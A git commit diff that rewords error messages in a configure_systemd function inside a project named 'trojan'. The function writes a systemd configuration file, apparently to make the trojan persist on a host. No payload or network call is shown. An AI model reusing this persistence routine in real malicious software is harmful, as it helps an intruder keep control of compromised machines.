c5ac69ae263eea2422c9478396776f84f0e50809
Arthur Bied-Charreton <arthurbiedchar@gmail.com>
2025-07-28 15:47:22 +0200

    Fix error logging in configure_systemd

--- src/trojan/main.c
+++ src/trojan/main.c
@@ -1,23 +1,24 @@
+#include "shield.h"
 #include <errno.h>
 #include <fcntl.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include "shield.h"
 
-
-int configure_systemd() {
+int
+configure_systemd() {
     int fd = open(SYSTEMD_CONFIG_PATH, O_TRUNC | O_CREAT | O_WRONLY);
     if (fd == -1) {
-        __log(stderr, "Could not open %s: %s\n", SYSTEMD_CONFIG_PATH, strerror(errno));
+        __log(stderr, "(open) Error opening %s: %s\n", SYSTEMD_CONFIG_PATH, strerror(errno));
         return -1;
     }
 
     if (write(fd, SYSTEMD_CONFIG, sizeof(SYSTEMD_CONFIG)) != sizeof(SYSTEMD_CONFIG)) {
         if (errno != 0) {
-            __log(stderr, "Error writing to %s: %s\n", SYSTEMD_CONFIG_PATH, strerror(errno));
+            __log(stderr, "(write) Error writing to %s: %s\n", SYSTEMD_CONFIG_PATH, strerror(errno));
         } else {
-            __log(stderr, "Unknow error opening %s\n", SYSTEMD_CONFIG_PATH);
+            __log(stderr, "(write) Error writing %s\n", SYSTEMD_CONFIG_PATH);
         }
         close(fd);
         return -1;
